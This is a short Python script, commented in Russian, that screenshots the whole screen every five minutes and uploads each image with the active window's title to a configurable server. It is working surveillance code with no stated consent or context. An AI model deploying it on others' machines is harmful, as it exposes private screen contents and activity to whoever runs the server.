import requests
import pyautogui
import time
import platform
import os
from datetime import datetime

SERVER_URL = "http://127.0.0.1:5000/upload"  # Заменить на IP сервера

def get_active_window():
    try:
        if platform.system() == "Windows":
            import win32gui
            window = win32gui.GetForegroundWindow()
            return win32gui.GetWindowText(window)
        elif platform.system() == "Linux":
            return os.popen("xdotool getwindowfocus getwindowname").read().strip()
        else:
            return "Mac не поддерживается"
    except Exception as e:
        return f"unknown (ошибка: {e})"

def main():
    while True:
        try:
            screenshot = pyautogui.screenshot()
            screenshot_path = f"temp_{datetime.now().strftime('%H-%M-%S')}.png"
            screenshot.save(screenshot_path)
            active_app = get_active_window()

            with open(screenshot_path, 'rb') as f:
                files = {'screenshot': f}
                data = {'active_app': active_app}
                response = requests.post(SERVER_URL, files=files, data=data)

            print(f"[{datetime.now()}] Отправлено: {active_app} | Ответ сервера: {response.text}")
            os.remove(screenshot_path)
        except Exception as e:
            print(f"Ошибка: {e}")
        time.sleep(300)  # 5 минут

if __name__ == '__main__':
    main()
